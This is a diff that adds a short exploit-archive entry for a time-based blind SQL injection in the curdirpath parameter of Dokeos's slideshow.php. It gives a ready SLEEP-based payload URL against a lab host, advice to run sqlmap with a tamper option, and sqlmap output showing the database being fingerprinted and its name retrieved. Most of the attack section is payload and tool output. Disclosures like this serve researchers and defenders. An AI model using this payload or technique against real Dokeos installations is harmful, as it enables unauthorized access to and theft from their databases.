@@ -1,0 +1,38 @@
+# Exploit Title: Dokeos Blind SQL Injection
+# Date: 2016-06-14
+# Exploit Author: Mormoroth
+# Exploit Author Blog: http://ha.cker.ir
+# Vendor Homepage: http://www.dokeos.com/
+# Software Link: http://jaist.dl.sourceforge.net/project/dokeos/dokeos-2.1.1.zip
+# Version: 2.2.1
+# Tested on: Ubuntu
+# Twitter : https://twitter.com/Mormoroth
+------
+Note : hackme.com is localdomain on lab , not a live website
+------
+VULNERABILITY
+curdirpath in slidshow.php is vulnerable to time-based blind sqlinjection
+------
+POC :
+
+Payload: http://hackme.com:80/dokeos-2.1.1/main/document/slideshow.php?cidReq=123&curdirpath=' AND (SELECT * FROM (SELECT(SLEEP(5)))Pfag) AND 'NFwV'='NFwV&slide_id=all
+------
+Exploiting vulnerability with Sqlmap
+Note : to exploit with sqlmap you should use --tamper=between option to retrieve data
+------
+Parameter: #1* (URI)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: http://hackme.com:80/dokeos-2.1.1/main/document/slideshow.php?cidReq=123&curdirpath=' AND (SELECT * FROM (SELECT(SLEEP(5)))Pfag) AND 'NFwV'='NFwV&slide_id=all
+------
+[22:25:09] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7
+back-end DBMS: MySQL 5.0.12
+[22:25:09] [INFO] fetching current database
+[22:25:09] [INFO] resumed: dokeos_main
+current database:    'dokeos_main'
+[22:25:09] [INFO] fetched data logged to text files under 'C:\Users\Mort\.sqlmap\output\hackme.com'
+
+C:\Users\Mort\Desktop\Apps\sqlmap>
+------
